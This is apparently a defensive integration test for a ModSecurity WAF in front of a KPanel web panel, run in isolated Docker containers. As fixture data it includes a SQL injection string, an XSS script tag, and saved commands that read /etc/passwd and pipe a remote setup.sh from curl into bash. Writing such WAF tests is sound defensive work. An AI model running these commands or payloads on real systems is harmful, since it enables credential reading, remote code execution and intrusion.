#!/usr/bin/env python3
"""Exercise real KPanel auth and saved commands behind the exact WAF image.

Use a registered validation host only. Both containers have no external network,
no published ports, no Agent/Docker socket and no production application data.
"""
import argparse
import http.client
import json
import os
from pathlib import Path
import socket
import subprocess
import sys
import time
import uuid

sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
import policy
import nginx_edit


def run(*args):
    result=subprocess.run(args,capture_output=True,text=True,timeout=90)
    if result.returncode:raise RuntimeError('Fixture command failed: '+' '.join(args[:3])+': '+result.stderr[-1200:])
    return result.stdout


def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('--work-dir',type=Path,required=True)
    parser.add_argument('--nginx-image',required=True)
    parser.add_argument('--panel-image',required=True)
    args=parser.parse_args()
    work=args.work_dir.absolute()
    work.mkdir(mode=0o700)
    data=work/'data';data.mkdir(mode=0o700);os.chown(data,65532,65532)
    logs=work/'logs';logs.mkdir()
    sockets=work/'sockets';sockets.mkdir()
    bundle=Path(__file__).resolve().parents[1]
    generated=work/'waf';generated.mkdir()
    suffix=uuid.uuid4().hex[:8]
    panel='waf-panel-'+suffix
    nginx='waf-front-'+suffix
    results=[]
    cookies={}
    config=json.loads((bundle/'example-policy.json').read_text())
    config.update(mode='on',cdn='direct',sites={'kpanel.example':{'profile':'kpanel'}})
    cf=policy.networks(json.loads((bundle/'cloudflare-ips.json').read_text()))
    for name,content in policy.bundle_files(config,cf).items():(generated/name).write_text(content)
    (generated/'blocked.map').write_text(policy.render_bans({},int(time.time())))
    fixture='''user nginx;
worker_processes 1;
pid /run/nginx.pid;
include /etc/nginx/conf.d/waf/load-module.conf;
error_log /var/log/nginx/error.log error;
events { worker_connections 256; }
http {
modsecurity on;
include /etc/nginx/conf.d/waf/http.conf;
server {
    listen unix:/sockets/front.sock;
    server_name kpanel.example;
    include /etc/nginx/conf.d/waf/server-default.inc;
    client_max_body_size 16m;
    location / {
        proxy_http_version 1.1;
        proxy_set_header Host kpanel.example;
        proxy_set_header X-Forwarded-Proto http;
        proxy_set_header X-Real-IP 8.8.8.8;
        proxy_pass http://127.0.0.1:18082;
    }
}
}
'''
    (work/'nginx.conf').write_text(nginx_edit.patch_site(fixture,config))

    def request(label,method,path,body=None,expected=200,authenticated=False,csrf=True):
        client=http.client.HTTPConnection('localhost',timeout=15)
        def connect():
            client.sock=socket.socket(socket.AF_UNIX)
            client.sock.settimeout(15)
            client.sock.connect(str(sockets/'front.sock'))
        client.connect=connect
        headers={'Host':'kpanel.example','Origin':'http://kpanel.example','Connection':'close'}
        if body is not None:
            if not isinstance(body,bytes):body=json.dumps(body).encode()
            headers['Content-Type']='application/json'
        if authenticated:
            headers['Cookie']='; '.join(k+'='+v for k,v in cookies.items())
            for name,value in cookies.items():
                if csrf and 'csrf' in name:headers['X-CSRF-Token']=value
        client.request(method,path,body,headers)
        response=client.getresponse()
        payload=response.read()
        for value in response.headers.get_all('Set-Cookie',[]):
            pair=value.split(';',1)[0]
            name,value=pair.split('=',1);cookies[name]=value
        record={'test':label,'status':response.status,'passed':response.status==expected}
        results.append(record);print(json.dumps(record),flush=True)
        client.close()
        if not record['passed']:raise AssertionError(label+': HTTP '+str(response.status))
        return json.loads(payload) if payload and payload[:1] in {b'{',b'['} else payload

    created=[]
    try:
        run('docker','run','-d','--name',panel,'--pull=never','--network=none','--read-only',
            '--memory=256m','--cpus=1','--pids-limit=128','--cap-drop=ALL',
            '--security-opt=no-new-privileges:true','--user','65532:65532',
            '--tmpfs','/tmp:rw,nosuid,size=16m','--mount','type=bind,src='+str(data)+',dst=/var/lib/kejilion-panel',
            '-e','KEJILION_PANEL_LISTEN=127.0.0.1:18082','-e','KEJILION_PANEL_DATA_DIR=/var/lib/kejilion-panel',
            '-e','KEJILION_PANEL_PUBLIC_URL=http://kpanel.example','-e','KEJILION_PANEL_SECURE_COOKIE=false',
            '-e','KEJILION_PANEL_TRUSTED_PROXY_CIDRS=127.0.0.1/32',args.panel_image)
        created.append(panel)
        deadline=time.monotonic()+20
        while not (data/'bootstrap.token').exists() and time.monotonic()<deadline:time.sleep(0.1)
        token=(data/'bootstrap.token').read_text().strip()
        run('docker','run','-d','--name',nginx,'--pull=never','--network=container:'+panel,
            '--read-only','--memory=768m','--cpus=1','--pids-limit=64',
            '--tmpfs','/tmp:rw,nosuid,size=64m','--tmpfs','/run:rw,nosuid,size=8m',
            '--tmpfs','/var/cache/nginx:rw,nosuid,size=32m',
            '--mount','type=bind,src='+str(work)+',dst=/test,readonly',
            '--mount','type=bind,src='+str(generated)+',dst=/etc/nginx/conf.d/waf,readonly',
            '--mount','type=bind,src='+str(logs)+',dst=/var/log/nginx',
            '--mount','type=bind,src='+str(sockets)+',dst=/sockets',
            '--mount','type=bind,src='+str(work/'nginx.conf')+',dst=/etc/nginx/nginx.conf,readonly',
            '--entrypoint','nginx',args.nginx_image,'-g','daemon off;')
        created.append(nginx)
        deadline=time.monotonic()+10
        while not (sockets/'front.sock').exists() and time.monotonic()<deadline:time.sleep(0.1)
        request('real-panel-health','GET','/api/v1/health')
        icon=request('real-bundled-Docker-icon','GET','/desktop-icons/docker-kpanel-flat-v1.webp')
        assert isinstance(icon,bytes) and icon[:4]==b'RIFF' and icon[8:12]==b'WEBP'
        password='Fixture9! '+"1' UNION SELECT password FROM users--"+' <script>alert(1)</script>'
        request('real-bootstrap-complex-password','POST','/api/v1/auth/bootstrap',
                {'token':token,'username':'waf-fixture','password':password},201)
        cookies.clear()
        request('real-login-complex-password','POST','/api/v1/auth/login',
                {'username':'waf-fixture','password':password})
        request('real-session-after-login','GET','/api/v1/auth/session',authenticated=True)
        workspace=request('real-workspace-read','GET','/api/v1/desktop/workspace',authenticated=True)
        workspace_input={k:workspace[k]for k in ['groups','hiddenEntryKeys','hiddenWidgetKeys','positions','widgetPositions','labels']}
        saved=request('real-workspace-save-command-and-path','PUT','/api/v1/desktop/workspace',
                      {**workspace_input,'expectedResourceVersion':workspace['resourceVersion'],'shortcuts':[{'id':'c'*32,'name':'Fixture command','targetType':'command','hostId':'local',
                       'command':'cat /etc/passwd; curl https://example.org/setup.sh | bash'}]},authenticated=True)
        self_read=request('real-workspace-read-back','GET','/api/v1/desktop/workspace',authenticated=True)
        assert self_read['shortcuts'][0]['command'].startswith('cat /etc/passwd;')
        request('real-workspace-remains-authenticated','PUT','/api/v1/desktop/workspace',
                {'expectedResourceVersion':self_read['resourceVersion'],'shortcuts':[{'command':'cat /etc/passwd'}]},401)
        denied=request('real-workspace-remains-CSRF-protected','PUT','/api/v1/desktop/workspace',
                {'expectedResourceVersion':self_read['resourceVersion'],'shortcuts':[{'command':'cat /etc/passwd'}]},403,authenticated=True,csrf=False)
        assert isinstance(denied,dict) and denied.get('code')
        validation=request('real-script-manage-reaches-application-validation','POST','/api/v1/apps/builtin-120/manage',{},422,authenticated=True)
        assert isinstance(validation,dict) and validation.get('code')
        snapshot=request('real-saved-commands-read','GET','/api/v1/terminal-commands',authenticated=True)
        request('real-saved-command-code-content','PUT','/api/v1/terminal-commands',
                {'expectedResourceVersion':snapshot['resourceVersion'],'items':[{'id':'a'*32,'name':'fixture',
                 'command':'printf "%s" "<script>alert(1)</script>"; echo "SELECT password FROM users"'},
                 {'id':'b'*32,'name':'fixture-second','command':'curl https://example.org/setup.sh | bash'}]},authenticated=True)
        request('authenticated-code-file-content-reaches-agent-boundary','PUT','/api/v1/files/content?path=/tmp/waf-fixture.sh',
                {'content':'#!/bin/sh\necho "<script>alert(1)</script>"\n','expectedResourceVersion':'sha256:'+'0'*64},503,authenticated=True)
        request('file-content-still-requires-application-session','PUT','/api/v1/files/content',
                {'content':'<script>alert(1)</script>','expectedResourceVersion':'sha256:'+'0'*64},401)
        request('wrong-password-still-rejected-by-application','POST','/api/v1/auth/login',
                {'username':'waf-fixture','password':password+'wrong'},401)
        request('SQLi-on-unrelated-query-still-blocked','GET',"/api/v1/health?q=1%27%20UNION%20SELECT%20password%20FROM%20users--",expected=403)
        # This profile never disables the whole site or the request body parser.
        request('malformed-JSON-still-rejected','POST','/api/v1/auth/login',b'{broken',400)
        request('username-field-is-not-excluded','POST','/api/v1/auth/login',
                {'username':"1' UNION SELECT password FROM users--",'password':'not-valid'},403)
        new_password=password+'N2!'
        request('real-password-change','PUT','/api/v1/settings/password',
                {'currentPassword':password,'newPassword':new_password},authenticated=True)
        cookies.clear()
        request('real-login-after-password-change','POST','/api/v1/auth/login',
                {'username':'waf-fixture','password':new_password})
        assert all(password.encode() not in p.read_bytes() for p in logs.glob('*') if p.is_file())
        results.append({'test':'legitimate-password-not-recorded-in-waf-logs','passed':True})
        print(json.dumps({'passed':len(results),'workspace':str(work)}))
    finally:
        (work/'results.json').write_text(json.dumps(results,indent=2))
        for name in reversed(created):
            log=subprocess.run(['docker','logs',name],capture_output=True)
            (work/(name+'.log')).write_bytes(log.stdout+log.stderr)
            subprocess.run(['docker','rm','-f',name],capture_output=True)


if __name__=='__main__':main()
